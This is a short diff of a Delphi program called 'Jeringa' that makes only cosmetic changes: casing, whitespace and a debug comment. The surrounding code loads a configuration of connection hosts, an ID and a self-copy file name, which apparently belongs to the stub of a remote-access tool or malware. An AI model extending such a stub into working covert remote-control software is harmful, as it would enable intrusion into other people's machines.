@@ -1,4 +1,4 @@
-program Jeringa;
+program jeringa;
 
 uses
   ShellApi,
@@ -150,7 +150,7 @@ end;
  begin
   if ReadSettings(ConfigLeida) = True then   //Leemos la configuración
     begin
-      Configuracion.sHosts                        := ConfigLeida^.sHosts;
+      Configuracion.sHosts                       := ConfigLeida^.sHosts;
       Configuracion.sID                          := ConfigLeida^.sID;
       Configuracion.bCopiarArchivo               := ConfigLeida^.bCopiarArchivo;
       Configuracion.sFileNameToCopy              := ConfigLeida^.sFileNameToCopy;
@@ -167,8 +167,8 @@ end;
       end
       else
       begin
-        exitprocess(0);//Debug
-        {Configuracion.sHosts                        := 'localhost:80¬';
+        exitprocess(0); //Para Debug
+        {Configuracion.sHosts                      := 'localhost:80¬';
         Configuracion.sID                          := 'id';
         Configuracion.bCopiarArchivo               := false;
         Configuracion.sFileNameToCopy              := 'a.exe';
